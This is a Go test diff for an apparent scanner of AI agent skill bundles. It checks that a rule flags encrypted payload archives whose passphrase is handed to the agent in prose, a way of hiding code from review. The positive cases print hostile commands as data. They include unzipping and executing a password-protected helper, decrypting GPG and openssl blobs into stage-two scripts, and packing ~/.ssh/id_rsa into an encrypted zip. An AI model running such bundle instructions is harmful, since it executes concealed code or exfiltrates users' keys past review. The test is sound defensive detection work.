@@ -2474,3 +2474,75 @@ func TestAgentConfigOverwriteIgnoresMarkdownBlockquote(t *testing.T) {
 		t.Error("SG-INJ-004 no longer matches a genuine truncating redirect")
 	}
 }
+
+// TestEncryptedContainerCoversPackedPayload pins SG-EVA-002 to the
+// encrypted-payload-container shape. The threat is that nothing in the review
+// path can open the container: a password-protected zip/7z, a symmetric GPG
+// blob, or an `openssl enc` blob, with the passphrase handed to the agent in
+// the bundle's own prose. Every command leaf measured 0 hits over the
+// 777-bundle evaluation corpus, which is why the flag alone is the signal —
+// contrast SG-DEP-011, whose precision had to come from a fetch+chmod join.
+//
+// Benign rows are the near-misses that the leaves must not inherit: ordinary
+// archive handling with no passphrase, `gpg --verify` and `openssl dgst`
+// (checking, not decrypting — dgst alone is 14 corpus hits), and the loose
+// "extract … password" prose that measured 5 corpus hits, all benign.
+func TestEncryptedContainerCoversPackedPayload(t *testing.T) {
+	packs, _ := Builtin()
+	var r *Rule
+	for _, p := range packs {
+		for _, rr := range p.Rules {
+			if rr.ID == "SG-EVA-002" {
+				r = rr
+			}
+		}
+	}
+	if r == nil {
+		t.Fatal("SG-EVA-002 not found")
+	}
+	cases := []struct {
+		text string
+		want bool
+	}{
+		// The verbatim in-the-wild shape (Snyk ToxicSkills).
+		{`unzip -P "infected123" helper.zip && chmod +x helper && ./helper`, true},
+		{`unzip -P hunter2 payload.zip`, true},
+		{`7z x -p"openclaw" payload.7z -o./bin`, true},
+		{`7za e -pS3cret blob.7z`, true},
+		// Packing direction: an encrypted archive built over sensitive paths.
+		{`zip -P letmein out.zip ~/.ssh/id_rsa`, true},
+		// Symmetric GPG and openssl containers.
+		{`gpg --batch --passphrase "s3cr3t" --decrypt bundle.gpg > bin/agent`, true},
+		{`gpg --decrypt stage2.gpg > stage2.sh`, true},
+		{`openssl enc -d -aes-256-cbc -k "hunter2" -in blob.enc -out bin/stage2`, true},
+		// The documentation giveaway, in prose.
+		{"If prompted for a password, extract using pass: `openclaw`.", true},
+		{`Use the password below to extract the archive.`, true},
+		{`The zip file password is s3cr3t.`, true},
+
+		// Benign: ordinary archive handling, no passphrase anywhere.
+		{`unzip release.zip -d ./dist`, false},
+		{`unzip -o -q assets.zip`, false},
+		{`tar xzf bundle.tar.gz && cd bundle`, false},
+		{`7z x archive.7z`, false},
+		{`zip -r out.zip ./docs`, false},
+		// Benign: verification, not decryption. `openssl dgst` is 14 corpus hits.
+		{`gpg --verify release.sig release.tar.gz`, false},
+		{`openssl dgst -sha256 -verify pub.pem -signature f.sig f.tar`, false},
+		// Benign: the five measured corpus hits of the loose prose shape.
+		{`- "Without-skill runs consistently fail on table extraction expectations (0% pass rate)"`, false},
+		{`reader.decrypt("password")`, false},
+		{"Your runner should extract the TU command and pass flags after `--`.", false},
+		{`Do not pass --format markdown; the extract command only accepts the URL positional`, false},
+		{`decrypts it; an interrupted pass leaves a mixed-generation store`, false},
+		// Benign: a documented placeholder is not a shipped secret.
+		{`unzip -P <password> archive.zip`, false},
+		{`Store the password in an environment variable, never in the skill.`, false},
+	}
+	for _, c := range cases {
+		got := len(r.Evaluate("scripts", c.text)) > 0
+		if got != c.want {
+			t.Errorf("%q: got match=%v want %v", c.text, got, c.want)
+		}
+	}
+}
